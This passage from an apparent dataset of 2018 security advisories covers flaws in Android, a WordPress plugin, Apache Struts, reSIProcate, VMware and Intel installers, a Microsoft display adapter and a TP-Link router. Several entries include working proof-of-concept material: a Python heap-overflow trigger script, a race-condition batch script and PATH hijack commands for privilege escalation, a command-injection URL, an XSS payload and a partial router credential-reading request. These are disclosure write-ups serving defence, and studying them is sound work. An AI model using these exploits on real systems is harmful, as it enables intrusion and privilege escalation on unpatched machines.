�android.net.wifi.p2p.THIS_DEVICE_CHANGED�.
STEPS TO REPLICATE BY DEVELOPERS VIA CODE
To replicate this in code, create a Broadcast receiver and register it
to receive these actions
(�android.net.wifi.WifiManager.NETWORK_STATE_CHANGED_ACTION� and
�android.net.wifi.WifiP2pManager.WIFI_P2P_THIS_DEVICE_CHANGED_ACTION�).
Sample code appears below:
public class MainActivity extends Activity {
@Override
public void onCreate(Bundle state) {
IntentFilter filter = new IntentFilter();
filter.addAction(android.net.wifi.WifiManager.NETWORK_STATE_CHANGED_ACTION);
filter.addAction(android.net.wifi.WifiP2pManager.WIFI_P2P_THIS_DEVICE_CHANGED_ACTION);
registerReceiver(receiver, filter);
}
BroadcastReceiver receiver = new BroadcastReceiver() {
@Override
public void onReceive(Context context, Intent intent) {
Log.d(intent.toString());
�.
}
};
VENDOR RESPONSE AND MITIGATION
The vendor fixed these issues in Android P / 9. Because this would be
a breaking API change, the vendor does not plan to fix prior versions
of Android. Users are encouraged to upgrade to Android P / 9 or later.
REFERENCES
Android ID # 77286245
CVE ID: CVE-2018-9489
Google Bug # 77236217
GitHub: Internal Broadcasts Monitor
[https://github.com/ViliusKraujutis/AndroidBroadcastsMonitor]
CREDITS
We want to thank Vilius Kraujutis for developing the Internal
Broadcasts Monitor application and making the source code available in
GitHub.
This advisory was written by Yakov Shafranovich.
TIMELINE
2018-03-28: Initial report submitted to the vendor
2018-03-29: Initial response from the vendor received � issue being investigated
2018-04-03: Follow-up communication with the vendor
2018-04-04: Follow-up communication with the vendor
2018-05-02: Checking on status, response from vendor � issue still
under investigation
2018-06-05: Checking status, no response from the vendor
2018-07-01: Checking status, no response from the vendor
2018-07-10: Response from vendor � issue still under investigation;
pinged for a timeline
2018-07-12: Pinged the vendor regarding CVE assignment and disclosure plans
2018-07-13: Information about the fix provided by the vendor;
follow-up communication
2018-07-14: Additional information provided to the vendor
2018-07-17: Additional information provided to the vendor
2018-07-19: Additional information provided to the vendor, response received
2018-08-09: Fix confirmed
2018-08-16: Initial draft of the advisory provided to the vendor for review
2018-08-21: Follow-up communication with the vendor
2018-08-22: CVE assigned by the vendor, follow-up communication with the vendor
2018-08-23: Final version of the advisory provided to the vendor for review
2018-08-29: Public disclosure / advisory published"
916,[CVE-2018-15877] Plainview Activity Monitor RCE,,CVE-2018-15877,"About:
===========
Component: Plainview Activity Monitor (Wordpress plugin)
Vulnerable version: 20161228 and possibly prior
Fixed version: 20180826
CVE-ID: CVE-2018-15877
CWE-ID: CWE-78
Author:
- Lydéric Lefebvre (https://www.linkedin.com/in/lydericlefebvre)
Timeline:
===========
- 2018/08/25: Vulnerability found
- 2018/08/25: CVE-ID request
- 2018/08/26: Reported to developer
- 2018/08/26: Fixed version
- 2018/08/26: Advisory published on GitHub
- 2018/08/26: Advisory sent to bugtraq mailing list
Description:
===========
Plainview Activity Monitor Wordpress plugin is vulnerable to OS
command injection which allows an attacker to remotely execute
commands on underlying system. Application passes unsafe user supplied
data to ip parameter into activities_overview.php.
Privileges are required in order to exploit this vulnerability, but
this plugin version is also vulnerable to CSRF attack and Reflected
XSS. Combined, these three vulnerabilities can lead to Remote Command
Execution just with an admin click on a malicious link.
References:
===========
https://github.com/aas-n/CVE/blob/master/CVE-2018-15877/"
921,[ANN] CVE-2018-11776 Apache Struts 2.3 to 2.3.34 and 2.5 to 2.5.16,,CVE-2018-11776,"[CVEID]:CVE-2018-11776
[PRODUCT]:Apache Struts
[VERSION]:Apache Struts 2.3 to 2.3.34 and 2.5 to 2.5.16
[PROBLEMTYPE]:Remote Code Execution
[REFERENCES]:https://cwiki.apache.org/confluence/display/WW/S2-057
[DESCRIPTION]:Man Yue Mo from the Semmle Security Research team was
noticed that Apache Struts versions 2.3 to 2.3.34 and 2.5 to 2.5.16
suffer from possible Remote Code Execution when using results with no
namespace and in same time, its upper action(s) have no or wildcard
namespace. Same possibility when using url tag which doesn’t have value
and action set and in same time, its upper action(s) have no or wildcard
namespace."
923,Mutiny Monitoring Appliance < 6.1.0-5263 - Command Injection (CVE-2018-15529),,CVE-2018-15529,"[Title]
Mutiny Monitoring Appliance < 6.1.0-5263 - Command Injection (CVE-2018-15529)
[Product]
Mutiny Monitoring Appliance
https://www.mutiny.com/
[CVE]
CVE-2018-15529
[Credit]
Reginald Dodd
[Description]
A command injection vulnerability in maintenance.cgi in Mutiny ""Monitoring Appliance"" before 6.1.0-5263 allows authenticated users, with access to the admin interface, to inject arbitrary commands within the filename of a system upgrade upload.
[Version Tested]
Version 6.1.0-5191 was tested and is vulnerable.
[Solution]
Upgrade to v6.1.0-5263.
[Reference]
https://www.mutiny.com/mutiny-support/previous-releases/ (Under the ""Patches/Bugs"" Fixed section)
[Timeline]
August 12, 2018 - A detailed report and exploit was sent to the vendor.
August 13, 2018 - The vendor released a patch (version 6.1.0-5263).
August 19, 2018 - Mitre assigned a CVE."
926,[CVE-2018-15528] Reflected XSS in Java System Solutions SSO Plugin 4.0.13.1 for BMC MyIT,,CVE-2018-15528,"Title:
======
Reflected XSS in Java System Solutions SSO Plugin 4.0.13.1 for BMC MyIT
Description:
============
Reflected Cross-Site Scripting in Java System Solutions' BMC MyIT SSO Plugin version 4.0.13.1 was identified during a penetration test. Other versions might be affected as well. A remote attacker can abuse this issue to inject client-side scripts into the ""select_sso()"" function. The payload is triggered when the victim opens a prepared link and hits the ""Login"" button.
Proof-of-concept:
=================
Open https://<hostname>/ux/jss-sso/arslogin?javascript:alert(%27Deloitte%20XSS%20PoC%27) and hit the ""Login"" button.
Affected function:
==================
function select_sso() {
console.log('SSO login');
id('loginForm').action= 'javascript:alert(%27Deloitte%20XSS%20PoC%27)';
id('username').name= 'username';
id('password').name= 'password';
usingsso(true);
Solution:
=========
Contact vendor for fix.
Disclosure Timeline:
====================
2018-07-17: Vulnerability discovered
2018-07-17: Vulnerability reported to manufacturer
2018-07-17: Response from manufacturer that vulnerability is known and has been fixed, but refused to provide any details
2018-08-09: Requested CVE ID from MITRE; CVE-2018-15528 was reserved
2018-08-20: Public disclosure of vulnerability & notification to manufacturer
Credits:
========
This security vulnerability was found by Marco Murch of Deloitte GmbH.
E-Mail: mamu[DELETE_ME_:-)]rch[at]deloitte[dot]de"
954,[CVE-2018-12584] Heap overflow vulnerability in reSIProcate through 1.10.2,,CVE-2018-12584,"CVE ID: CVE-2018-12584
TIMELINE
Bug report with test code sent to main reSIProcate developers: 2018-06-15
Patch created by Scott Godin: 2018-06-18
CVE ID assigned: 2018-06-19
Patch committed to reSIProcate repository: 2018-06-21
Advisory first published on website: 2018-06-22
Advisory sent to Bugtraq mailing list: 2018-08-08
DESCRIPTION
A heap overflow can be triggered in the reSIProcate SIP stack when TLS is
enabled.
Abuse of this vulnerability may cause a denial of service of software using
reSIProcate and may also lead to remote code execution.
No SIP user authentication is required to trigger the vulnerability on the
client or server side.
TECHNICAL DETAILS
The file resiprocate/resip/stack/ConnectionBase.cxx contained the following
code fragment:
bool
ConnectionBase::preparseNewBytes(int bytesRead)
{
/* ... */
else if (mBufferPos == mBufferSize)
{
// .bwc. We've filled our buffer; go ahead and make more room.
size_t newSize = resipMin(mBufferSize*3/2, contentLength);
char* newBuffer = 0;
try
{
newBuffer=new char[newSize];
}
catch(std::bad_alloc&)
{
ErrLog(>>""Failed to alloc a buffer while receiving body!"");
return false;
}
memcpy(newBuffer, mBuffer, mBufferSize);
mBufferSize=newSize;
delete [] mBuffer;
mBuffer = newBuffer;
}
/* ... */
}
Execution of the code above could be triggered by sending a partial SIP
message over TLS with a Content-Length header field, followed by sending a
packet over TLS with its associated SIP message body. By setting the
Content-Length field to a value that is lower than the length of the SIP
message body which followed, a malicious user could trigger a heap buffer
overflow.
The bug did not appear to be reproducible using TCP instead of TLS even when
the TCP packets were sent with delays between them.
TEST CODE
The following Python script can be used to test the vulnerability of both
server and client software based on reSIProcate.
#!/usr/bin/python3
# reSIProcate through 1.10.2 SIP over TLS heap overflow bug test code
# Written by Joachim De Zutter (2018)
from socket import *
from ssl import * # pip install pyopenssl
daemon_mode = False
# server to test (in case daemon_mode = False)
server = """"
port = 5061
# server configuration (in case daemon_mode = True)
server_ip = ""xxx.xxx.xxx.xxx""
keyfile = ""keyfile.pem""
certfile = ""certfile.pem""
username = ""test""
via = ""192.168.13.37:31337""
callid = ""LtCwMvc2C5tca58a5Ridwg..""
cseq = 1
def trigger_server_heap_overflow(connection):
global username, server, via, cseq
print(""Triggering heap overflow!"")
buffer_length = 100
register_packet = ""REGISTER sip:"" + server + "" SIP/2.0x0dx0aVia:
SIP/2.0/TCP "" + via + ""x0dx0aContact: <sip:"" + username + ""@"" + via
+ "">x0dx0aTo: <sip:"" + username + ""@"" + server +
"";transport=TCP>x0dx0aFrom: <sip:"" + username + ""@"" + server +
"">x0dx0aCSeq: "" + ""%d"" % cseq + "" REGISTERx0dx0aExpires:
600x0dx0aContent-Length: %ld"" % buffer_length + ""x0dx0ax0dx0a""
oversized_packet = buffer_length * ""A"" + 64 * ""B""
connection.send(register_packet.encode())
cseq = cseq + 1
connection.send(oversized_packet.encode())
def trigger_client_heap_overflow(connection):
global username, via, callid, cseq
print(""Triggering heap overflow!"")
buffer_length = 100
content_length_packet = ""SIP/2.0 200 OKx0dx0aVia: SIP/2.0/TLS
10.0.2.15:32703;branch=z9hG4bK-524287-1---c04a0ad2231e66ab;rportx0dx0aFrom:
<sip:"" + username + ""@"" + via +
"";transport=TLS>;tag=00649d4dx0dx0aTo: <sip:"" + username + ""@"" + via
+ "";transport=TLS>x0dx0aCall-ID: "" + callid + ""x0dx0aCSeq: 2
PUBLISHx0dx0aExpires: 600x0dx0aContent-Length: %ld"" %
buffer_length + ""x0dx0aSIP-ETag:
af6079e42f65e7e2340e92565570e295x0dx0ax0dx0a""
oversized_packet = buffer_length * ""A"" + 64 * ""B""
connection.send(content_length_packet.encode())
cseq = cseq + 1
connection.send(oversized_packet.encode())
connection.shutdown(SHUT_RDWR)
connection.close()
def test_clients():
global server_ip, keyfile, certfile
server_socket=socket(AF_INET, SOCK_STREAM)
server_socket.bind((server_ip, 5061))
server_socket.listen(1)
tls_server = wrap_socket(server_socket,
ssl_version=PROTOCOL_TLSv1, cert_reqs=CERT_NONE, server_side=True,
keyfile=keyfile, certfile=certfile)
print(""Server running!"")
done = False
while not done:
connection, client_address= tls_server.accept()
print(""Connection from "" + client_address[0] + "":%d"" %
client_address[1])
data_in = connection.recv(1024)
if not data_in:
done = True
break
message = data_in.decode()
if ""SUBSCRIBE"" in message:
print(""Client sent SUBSCRIBE request"")
trigger_client_heap_overflow(connection)
def test_server():
global server, port
context = create_default_context()
context.check_hostname = False
context.verify_mode = CERT_NONE
tls_client = context.wrap_socket(socket(AF_INET), server_hostname=server)
tls_client.connect((server, port))
print(""Connected!"")
trigger_server_heap_overflow(tls_client)
tls_client.shutdown(SHUT_RDWR)
tls_client.close()
def main():
global daemon_mode
if daemon_mode:
test_clients()
else:
test_server()
if __name__ == ""__main__"":
main()
EXPLOITABILITY
At http://joachimdezutter.webredirect.org/CVE-2018-12584-exploitability.html
the exploitability of an affected version of repro on Windows XP Professional
with Service Pack 3 was examined, it was separated from this text because AVG
Web Shield considered the text to be a threat. Arbitrary code execution has
proven to be possible and may be possible on other operating systems and
software based on affected versions of reSIProcate as well.
SOLUTION
A patch was created by Scott Godin, it was committed to the reSIProcate
repository at
https://github.com/resiprocate/resiprocate/commit/2cb291191c93c7c4e371e22cb89805a5b31d6608
The following software based on reSIProcate contains a fix for the issue:
3CX Phone System 15.5.13470.6 and higher
For Debian 8 ""Jessie"", CVE-2018-12584 and CVE-2017-11521 have been fixed in
resiprocate package version 1:1.9.7-5+deb8u1
(https://lists.debian.org/debian-lts-announce/2018/07/msg00031.html)
DISCLAIMER
The information in this report is believed to be accurate at the time of
publishing based on currently available information.
Use of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the author
nor the publisher accepts any liability for any direct, indirect, or
consequential loss or damage arising from use of, or reliance on, this
information."
966,CVE-2016-7085 NOT fixed in VMware-player-12.5.9-7535481.exe,,CVE-2016-7085,"Hi @ll,
on February 13, 2016, I sent a vulnerability report regarding the
then current executable installer of VMware-player 7.1.3 to its
vendor.
On September 14, 2016, VMware published
<http://blogs.vmware.com/security/2016/09/vmsa-2016-0014.html> and
<http://www.vmware.com/security/advisories/VMSA-2016-0014.html>
I was NOT AMUSED that it took 7 month to fix this beginner's error.
In January 2018, VMware published VMware-player-12.5.9-7535481.exe,
available via <https://www.vmware.com/go/downloadplayer> from
<https://download3.vmware.com/software/player/file/VMware-player-12.5.9-7535481.exe>,
which shows this vulnerability again (plus THREE others), again
allowing arbitrary code execution WITH escalation of privilege!
Apparently VMware's developers haven't heard of regression tests
yet, and their QA (if they have one) seems sound asleep!
On a fully patched Windows 7 SP1, VMware-player-12.5.9-7535481.exe
loads CredSSP.dll, WSHTCPIP.dll, WSHIP6.dll and RASAdHlp.dll from
its ""application directory"", typically the user's ""Downloads""
directory ""%USERPROFILE%Downloads"", instead from Windows'
""system directory"" ""%SystemRoot%System32"".
For this well-known and well-documented vulnerability see
<https://cwe.mitre.org/data/definitions/426.html> and
<https://cwe.mitre.org/data/definitions/427.html> plus
<https://capec.mitre.org/data/definitions/471.html>.
The application manifest embedded in VMware-player-12.5.9-7535481.exe
specifies ""requireAdministrator"", so any (rogue) DLL placed by the
unprivileged user in the ""Downloads"" directory is executed with
administrative rights, resulting in arbitrary code execution WITH
escalation of privilege.
CVSS v3 Base Score: 8.2 (High) CVSS:3.0/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H
CVSS v2 Base Score: 7.8 AV:L/AC:M/Au:N/C:C/I:C/A:C
Demonstration/proof of concept:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. follow the instructions from
<https://skanthak.homepage.t-online.de/minesweeper.html>
and build a minefield of 32-bit forwarder DLLs in your ""Downloads""
directory;
2. download
<https://download3.vmware.com/software/player/file/VMware-player-12.5.9-7535481.exe>,
and save it in your ""Downloads"" directory;
3. execute VMware-player-12.5.9-7535481.exe: notice the message
boxes displayed from the DLLs built in step 1!
stay tuned (and FAR away from ALL executable installers!)
Stefan Kanthak
Timeline:
~~~~~~~~~
2018-06-03 vulnerability report(s) sent to vendor
2018-06-13 vendor acknowledged receipt:
""We will look into this and provide feedback in due course.""
2018-06-14 vendor replies:
""It is my understanding that Workstation Player 12.x has
since reached end of general support (in February of 2018)
as per our Lifecycle Product Matrix
<https://www.vmware.com/content/dam/digitalmarketing/vmware/en/pdf/support/product-lifecycle-matrix.pdf>.""
2018-08-01 report published"
970,"secuvera-SA-2018-03: Command Injection, Broken Access Control and Evil-Twin-Attack in Microsoft Wireless Display Adapter V2 - CVE-2018-8306",,CVE-2018-8306,"secuvera-SA-2018-03: Command Injection, Broken Access Control and Evil-Twin-Attack in Microsoft Wireless Display Adapter V2 - CVE-2018-8306
Affected Products:
Microsoft Wireless Display Adapter V2:
- Microsoft Wireless Display Adapter V2 Softwareversion 2.0.8350 to 2.0.8372 have been tested and are affected by the Command Injection Vulnerability
- Microsoft Wireless Display Adapter V2 Softwareversion 2.0.8350 has been tested and is affected by the Broken Access Control Vulnerability
- Microsoft Wireless Display Adapter V2 Softwareversion 2.0.8350 has been tested and is affected by the Evil-Twin-Attack Vulnerability
Other releases have not been tested.
References
- https://www.secuvera.de/advisories/secuvera-SA-2018-03.txt
- https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-8306 (Command Injection)
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8306 (Command Injection)

Summary:
Microsoft Wireless Display Adapter (MsWDA ) is a hardware device to
""Share what’s on your tablet, laptop, or smartphone. All
Miracast® enabled Windows 10 phones, tablets and laptops,
including the Surface line up. Stream movies, view personal
photos, or display a presentation on a big screen – all
wirelessly."" [1]

During our research we found a command-injection, broken
access control and an ""evil-twin"" attack.

Background:
MsWDA uses Wifi-Direct for the Connection and Miracast for
transmitting Video- and Audiodata. The Wifi-Connection
between MsWDA and the Client is alwasy WPA2 encrypted. To
setup the connection, MsWDA provides a well-known mechanism:
Wi-Fi Protected Setup (WPS). MsWDA implements both push
button configuration (PBC) and PIN configuration. Despite the
original design and name, MsWDA offers PBC with the button
virtually ""pressed"". A user simply connects. Regardless the
authentication method used (PBC or PIN), a client is assigned
to a so called ""persistent group"". A client in a persistent
group does not have to re-authenticate on a new connection.

Effect:
Command injection:
The attacker has to be connected to the MsWDA.Using the
Webservice the Name of the MsWDA could be set in the
parameter ""NewDeviceName"". Appending characters
to escape command line scripts, the device gets into a
boot loop. Therefore the conclusion is legit, there is
a command injection. After several bricked MsWDAs we gave
up.

Broken Access Control:
a) PBC is implemented against Wifi Alliance Best Practices [2]
No Button has to be pressed, therefore the attacker has
just to be in network range to authenticate. Physical access
to the device is not required.

b) If an attacker has formed a persistent group with Push
Button Configuration, he can authenticate with the persistent
group, even if the configuration method is changed to PIN
Configuration.

c) A persistent group does not expire, so the access right
longs forever. The WPA2 key of the connection does not change
for a persistent group.

Evil-Twin-Attack:
To perform an Evil-Twin Attack, the Attacker has to be connected
to the MsWDA attacked. He then offers an own Display Adapter Service
with the same name like the MsWDA attacked. The user will only find
the attackers name in the available connections and connect to the
attackers Evil Twin. A replication service will stream the users data
from the attackers device to the MsWDA attacked. Therefore the user
will not be able to recognize the attack.
Besides the ability to view streaming data, the attacker can use
the established connection to access other services on the victims
device, e. g. files if shared to trusted networks by the user.
Vulnerable Script for the command injection:
/cgi-bin/msupload.sh, Parameter NewDeviceName

Example for command injection:
http://IPaddress/cgi-bin/msupload.sh?Action=SetDeviceName&NewDeviceName=a=b
#show a device name with leading adapter_name=
http://IPaddress/cgi-bin/msupload.sh?Action=SetDeviceName&NewDeviceName=a%0D$(ls)%0D
#bring Display Adapter into a bootloop

Solution:
Always use PIN method for authentication. This does not require
the attacker to have physical access, at least he nees the screen visible.
According to the vendor, the command injection has been fixed in
the firmware update July 2018.

Disclosure Timeline:
2018/03/21 vendor contacted
2018/03/21 initial vendor response
2018/04/06 vendor confirmation
2018/04/20 vendor informs about fixes planned
2018/04/21 feedback to the vendor on the fixes
2018/05/17 vendor provides timeline for the firmware fixes for July 10th
2018/06/19 vendor provides assigend CVE number
2018/07/10 vendor publishes Advisory and Firmware-Updates
2018/07/30 coordinated public disclosure



External References:
[1] https://www.microsoft.com/accessories/en-us/products/adapters/wireless-display-adapter-2/p3q-00001
[2] https://www.wi-fi.org/downloads-public/wsc_best_practices_v2_0_1.pdf/8188

Credits:
Tobias Glemser
tglemser secuvera de
secuvera GmbH
https://www.secuvera.de

Simon Winter
simon.winter95 web de
Aalen University
https://www.hs-aalen.de/en

Disclaimer:
All information is provided without warranty. The intent is to
provide information to secure infrastructure and/or systems, not
to be able to attack or damage. Therefore secuvera shall
not be liable for any direct or indirect damages that might be
caused by using this information."
1041,"[CVE-2018-3667, CVE-2018-3668] Escalation of priviilege via executable installer of Intel Processor Diagnostic Tool",,CVE-2018-3667,"Hi @ll,
the executable installers of Intel's Processor Diagnostic Tool
(IPDT) before v4.1.0.27 have three vulnerabilities^Wbeginner's
errors which all allow arbitrary code execution with escalation
of privilege, plus a fourth which allows denial of service.
Intel published advisory SA-00140
<https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00140.html>
on 2018-06-27 and updated installers on 2018-05-18.
The vulnerabilities can be exploited in standard installations
of Windows where the user^WUAC-""protected administrator"" account
created during Windows setup is used, without elevation.
This precondition holds for the majority of Windows installations:
according to Microsoft's own security intelligence reports
<https://www.microsoft.com/security/sir>, about 1/2 to 3/4 of the
about 600 million Windows installations which send telemetry data
have only ONE active user account.
#1 Denial of service through insecure file permissions
======================================================
The downloadable executable installer (really: executable
self-extractor built with WinZIP) IPDT_Installer_4.1.0.24.exe
creates a subdirectory with random name in %TEMP%, copies
itself into this subdirectory and then executes its copy.
The subdirectory inherits the NTFS ACLs from its parent
%TEMP%, and so does the copy of the executable self-extractor.
For this well-known and well-documented vulnerability see
<https://cwe.mitre.org/data/definitions/377.html> and
<https://cwe.mitre.org/data/definitions/379.html> plus
<https://capec.mitre.org/data/definitions/29.html>
Proof of concept/demonstration:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. download IPDT_Installer_4.1.0.24.exe (quite some clueless
copycats still offer it, violating Intel's copyright;
<http://d.computerbild.de/downloads/7835763/IPDT_Installer_4.1.0.24.exe>)
and save it in your ""Downloads"" directory"";
2. add the NTFS access control list entry (D;OIIO;WP;;;WD)
meaning ""deny execution of files in this directory for
everyone, inheritable to files in all subdirectories""
to the (user's) %TEMP% directory.
3. execute IPDT_Installer_4.1.024.exe: notice the complete
failure of the executable installer^Wself-extractor,
WITHOUT error message!
#2 Escalation of privilege through insecure file permissions
============================================================
Although the (copy of the) executable self-extractor runs with
administrative privileges (its embedded ""application manifest""
specifies 'requireAdministrator'), it extracts its payload, the
REAL installers setup.exe and setup64.exe, plus the batch script
setup.bat, UNPROTECTED into the user's %TEMP% directory, CD's
into %TEMP% and finally executes the extracted batch script
%TEMP%setup.bat:
--- setup.bat ---
echo off
ver | findstr 6.1.7600
if %errorlevel%==0 goto WinUnsup
ver | findstr 6.0.6001
if %errorlevel%==0 goto WinUnsup
if ""%programfiles(x86)%XXX""==""XXX"" goto 32BIT
:64BIT
setup64.exe
goto END
:32BIT
setup.exe
goto END
:WinUnsup
echo Intel Processor Diagnostic Tool cannot be installed on this Operating System
echo Please go to Online support page to view list of supported Oerating Systems
pause
:END
exit 0
--- EOF ---
The extracted files inherit the NTFS ACLs from their parent
%TEMP%, allowing ""full access"" for the unprivileged (owning)
user, who can replace/overwrite the files between their creation
and execution.
Since the files are executed with administrative privileges,
this vulnerability results in arbitrary code execution with
escalation of privilege.
Proof of concept/demonstration:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. create the following batch script in an arbitrary directory:
--- IPDT.CMD ---
:LOOP1
@If Not Exist ""%TEMP%setup.exe"" Goto :LOOP1
Echo >""%TEMP%setup.bat"" WhoAMI.exe /all
Echo >>""%TEMP%setup.bat"" Pause
:LOOP2
@If Not Exist ""%TEMP%setup64.exe"" Goto :LOOP2
Copy /Y %COMSPEC% ""%TEMP%setup.exe""
:LOOP3
@Copy %COMSPEC% ""%TEMP%setup64.exe""
@If ERRORLEVEL 1 Goto :LOOP3
--- EOF ---
NOTE: the batch script needs to win a race (which it almost
always will, due to the size of the files extracted).
2. execute the batch script per double-click;
3. execute IPDT_Installer_4.1.024.exe per double-click: notice
the command processor started instead one of the executable
installers, running with administrative privileges.
#3 Escalation of privilege through unsafe search path
=====================================================
In Windows Vista and newer versions, the current working
directory can be removed from the executable search path:
<https://msdn.microsoft.com/en-us/library/ms684269.aspx>
The batch script setup.bat calls setup.exe and setup64.exe
without a path, so the command processor doesn't find the
extracted setup.exe and setup64.exe in its CWD and searches
them via %PATH%.
%PATH% is under full control of the unprivileged user, who
can create rogue setup.exe and setup64.exe in an arbitrary
directory he adds to the %PATH%, resulting again in arbitrary
code execution with escalation of privilege.
For this well-known and well-documented vulnerability see
<https://cwe.mitre.org/data/definitions/426.html> and
<https://cwe.mitre.org/data/definitions/427.html> plus
<https://capec.mitre.org/data/definitions/471.html>.
Proof of concept/demonstration:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. start an unprivileged command prompt in an arbitrary
directory where the unprivileged user can create files,
for example the user's ""Downloads"" directory;
2. add this (current working) directory to the user's PATH:
PATH %CD%;%PATH%
REG.exe Add HKCUEnvironment /V PATH /T REG_SZ /D ""%CD%"" /F
3. copy the command processor %COMSPEC% (or any rogue executable
of your choice) as setup.exe and setup64.exe into the current
(working) directory:
COPY %COMSPEC% ""%CD%setup.exe""
COPY %COMSPEC% ""%CD%setup64.exe""
4. set the environment variable NoDefaultCurrentDirectoryInExePath
to an arbitrary value:
SET NoDefaultCurrentDirectoryInExePath=*
REG.exe Add HKCUEnvironment /V NoDefaultCurrentDirectoryInExePath /T REG_SZ /D ""*"" /F
5. execute IPDT_Installer_4.1.024.exe per double-click: notice
the command processor started instead of the extracted
executable installers, running with administrative privileges.
#4 Escalation of privilege through DLL search order hijacking
=============================================================
The extracted executable installers setup.exe and setup64.exe,
built with the crapware known as InstallShield, load multiple
Windows system DLLs from their ""application directory"" %TEMP%
instead from Windows' ""system directory"" %SystemRoot%System32
To quote Raymond Chen
<https://blogs.msdn.microsoft.com/oldnewthing/20121031-00/?p=6203>
| a rogue DLL in the TEMP directory is a trap waiting to be sprung.
An unprivileged attacker running in the same user account can
copy rogue DLLs into %TEMP%; these are loaded and their DllMain()
routine executed with administrative privileges, once more
resulting in arbitrary code execution with escalation of privilege.
For this well-known and well-documented vulnerability see
<https://cwe.mitre.org/data/definitions/426.html> and
<https://cwe.mitre.org/data/definitions/427.html> plus
<https://capec.mitre.org/data/definitions/471.html>.
Proof of concept/demonstration:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. follow the instructions from
<https://skanthak.homepage.t-online.de/minesweeper.html>
and build a minefield of forwarder DLLs in your %TEMP%
directory;
NOTE: if you can't or don't want to build the minefield, download
<https://skanthak.homepage.t-online.de/download/SENTINEL.DLL>
and save it as UXTheme.dll, DWMAPI.dll, NTMARTA.dll and
MSI.dll in your %TEMP% directory.
2. execute IPDT_Installer_4.1.0.24.exe: notice the message boxes
displayed from the DLLs built in step 1!
NOTE: on a fully patched Windows 7 SP1, setup64.exe loads at
least the following 32-bit DLLs from %TEMP%:
UXTheme.dll, Version.dll, NTMARTA.dll and MSI.dll
Due to its filename, setup.exe additionally loads WinMM.dll,
SAMCli.dll, MSACM32.dll, SFC.dll, SFC_OS.dll, DWMAPI.dll and
MPR.dll.
Fix:
====
1. DUMP all those forever vulnerable executable installers and
self-extractors; provide an .MSI package or an .INF script plus
a .CAB archive instead!
2. NEVER use an unqualified filename to execute/load an application
or a DLL, ALWAYS specify their fully qualified pathname!
Mitigations:
============
1. DON'T execute executable self-extractors.
2. NEVER execute executable self-extractors with administrative
privileges.
3. extract the payload of the self-extractor with a SAFE and SECURE
unzip.exe into a properly protected directory.
4. exercise STRICT privilege separation: use separate unprivileged
user accounts and privileged administrator account, DISABLE the
""security theatre"" UAC in the unprivileged user accounts.
stay tuned
Stefan Kanthak
PS: the ""portable executable"" IPDT_Installer_4.1.024.exe has an
export directory, but does NOT export any symbols: both the
numbers of names and functions are 0, and the RVAs of the
functions, names and ordinals arrays are 0 too.
Timeline:
=========
2018-03-28 sent vulnerability report to <secure intel com>
no reply, not even an acknowledgement of receipt
2018-04-05 resent vulnerability report to <secure intel com>,
CC: to CERT/CC
no reply, not even an acknowledgement of receipt
2018-05-03 resent vulnerability report via HackerOne
2018-05-04 Intel acknowledges receipt
2018-05-17 Intel confirms the reported vulnerabilities
2018-05-21 Intel publishes fixed installers, with a dangling
reference to SA-00140 in the release notes, plus
inaccuracies regarding the dependencies of IPDT
NO notification sent to me that fixes have been
published!
2018-06-05 sent report about the errors in the release notes
after stumbling over the fixes
2018-06-12 Intel acknowledges the report regarding the notes
2018-06-27 Intel publishes their advisory SA-00140
AGAIN no notification sent that the advisory has
been published!
Intel's understanding of coordinated disclosure
looks rather weird to me."
1044,[CVE-2018-8036] DoS (OOM) Vulnerability in Apache PDFBox's AFMParser,,CVE-2018-8036,"[CVE-2018-8036] DoS (OOM) Vulnerability in Apache PDFBox's AFMParser
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Apache PDFBox 1.8.0 to 1.8.14
Apache PDFBox 2.0.0 to 2.0.10
Earlier, unsupported Apache PDFBox versions may be affected as well
Description:
A carefully crafted (or fuzzed) file can trigger an infinite loop which leads to an out of memory exception in Apache PDFBox's AFMParser.
Mitigation:
Upgrade to Apache PDFBox 1.8.15 respectively 2.0.11
Credit:
This issue was discovered by Tobias Ospelt"
1048,TP-Link TL-WR841N v13: Broken Authentication (CVE-2018-12575),,CVE-2018-12575,"* Vulnerability: Broken Authentication
* Affected Software: TP-Link TL-WR841N v13
* Affected Version: 0.9.1 4.16 v0001.0 Build 171019 Rel.55346n
* Patched Version: 0.9.1 4.16 v0001.0 Build 180119 Rel.65243n
* Risk: High
* Vendor Contacted: 05/20/2018
* Vendor Fix: Issue was independently fixed in previous version
* Public Disclosure: 06/27/2018
##### Overview
An attacker that can send HTTP requests to the router can bypass the
authentication mechanism of the web interface and thus perform arbitrary
actions.
##### CVSS
High 8.8 CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
##### Details
An unauthenticated attacker can send arbitrary requests to CGI scripts,
which allows them to perform all actions an authenticated user could
perform, as well as read out all information that an authenticated user
can read out. With default configuration, the attacker has to be in the
same local network as the router.
The issue exists because while the frontend of the web interface has a
basic authentication mechanism, requests to the CGI scripts fail to
validate the authentication cookie.
##### POC
Read out Wifi password:
curl -i -s -k -X $'POST' -H $'Host: 192.168.0.1' -H $'Referer:
http://192.168.0.1/' -H $'Content-Type: text/plain' -H $'Content-Length:
404' -H $'Connection: close' --data-binary
